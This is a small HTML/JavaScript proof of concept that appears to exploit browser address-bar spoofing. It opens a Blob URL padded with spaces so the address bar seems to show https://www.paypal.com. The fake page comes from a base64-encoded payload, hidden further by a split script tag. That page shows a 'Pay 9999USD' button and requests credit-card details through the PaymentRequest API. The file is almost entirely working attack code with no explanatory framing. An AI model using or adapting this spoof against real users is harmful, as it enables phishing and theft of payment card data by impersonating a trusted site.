<script>
var haha = function(){
var spoof_fn = function () {
  payload="PGNlbnRlcj48aW1nIHNyYz1odHRwOi8veGlzaWdyLmNvbS90ZXN0MTk5NS9kZDExLmpwZz48YnI+CjxidXR0b24gdHlwZT0iYnV0dG9uIiBpZD0iYnV5QnV0dG9uIj5QYXkgOTk5OVVTRCAoaHR0cHM6Ly93d3cucGF5cGFsLmNvbSk8L2J1dHRvbj48L2NlbnRlcj4KCjxzY3JpcHQ+Ci8vIENoZWNrIGlmIHBheW1lbnQgcmVxdWVzdCBBUEkgaXMgc3VwcG9ydGVkCnZhciBidXlCdXR0b24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnV5QnV0dG9uJyk7CmlmICgnUGF5bWVudFJlcXVlc3QnIGluIHdpbmRvdykgewogIGJ1eUJ1dHRvbi5zZXRBdHRyaWJ1dGUoJ3N0eWxlJywgJ2Rpc3BsYXk6IGlubGluZTsnKTsKICBidXlCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBvbkJ1eUNsaWNrZWQpOwp9IGVsc2UgewogIGJ1eUJ1dHRvbi5zZXRBdHRyaWJ1dGUoJ3N0eWxlJywgJ2Rpc3BsYXk6IG5vbmU7Jyk7CiAgQ2hyb21lU2FtcGxlcy5zZXRTdGF0dXMoJ1RoaXMgYnJvd3NlciBkb2VzIG5vdCBzdXBwb3J0IHdlYiBwYXltZW50cy4gUGxlYXNlIHRyeSBvbiBtb2JpbGUgQ2hyb21lLicpOwp9CgovKioKKiBJbnZva2VzIFBheW1lbnRSZXF1ZXN0IGZvciBjcmVkaXQgY2FyZHMuCiovCnZhciBkZXRhaWxzID0gewogIHRvdGFsOiB7bGFiZWw6ICdEb25hdGlvbicsIGFtb3VudDoge2N1cnJlbmN5OiAnVVNEJywgdmFsdWU6ICc5OTk5LjAwJ319LAogIGRpc3BsYXlJdGVtczogWwogICAgewogICAgICBsYWJlbDogJ09yaWdpbmFsIGRvbmF0aW9uIGFtb3VudCcsCiAgICAgIGFtb3VudDoge2N1cnJlbmN5OiAnVVNEJywgdmFsdWU6ICc5ODAwLjAwJ30KICAgIH0sCiAgICB7CiAgICAgIGxhYmVsOiAnRnJpZW5kcyBhbmQgZmFtaWx5IGRpc2NvdW50JywKICAgICAgYW1vdW50OiB7Y3VycmVuY3k6ICdVU0QnLCB2YWx1ZTogJy0xOTkuMDAnfQogICAgfQogIF0KfTsKdmFyIHBheW1lbnRSZXF1ZXN0T2JqOwoKZnVuY3Rpb24gb25CdXlDbGlja2VkKCkgewogIHZhciBzdXBwb3J0ZWRJbnN0cnVtZW50cyA9IFt7CiAgICBzdXBwb3J0ZWRNZXRob2RzOiBbJ3Zpc2EnLCAnbWFzdGVyY2FyZCcsJ2FtZXgnXQogIH1dOwoKICBuZXcgUGF5bWVudFJlcXVlc3Qoc3VwcG9ydGVkSW5zdHJ1bWVudHMsIGRldGFpbHMpIC8vIGVzbGludC1kaXNhYmxlLWxpbmUgbm8tdW5kZWYKICAuc2hvdygpCiAgLnRoZW4oZnVuY3Rpb24oaW5zdHJ1bWVudFJlc3BvbnNlKSB7CiAgICBwYXltZW50UmVxdWVzdE9iaiA9IGluc3RydW1lbnRSZXNwb25zZTsKICAgIHNlbmRQYXltZW50VG9TZXJ2ZXIoaW5zdHJ1bWVudFJlc3BvbnNlKTsKICB9KQogIC5jYXRjaChmdW5jdGlvbihlcnIpIHsKICAgIENocm9tZVNhbXBsZXMuc2V0U3RhdHVzKGVycik7CiAgfSk7Cn0KPC9zY3JpcHQ+";       
  document.write(atob(payload));
  };

  args = ['<title>www.paypal.com</title><scr', 'ipt>(', spoof_fn, ')();</scri', 'pt>'];
  b = new Blob(args, {type: 'text/html'});
  evil_url = URL.createObjectURL(b) + '#' + Array(0x100).join(" ") +'https://www.paypal.com';
  window.open(evil_url);
};
</script>
<button onclick='haha()'>click me</button>
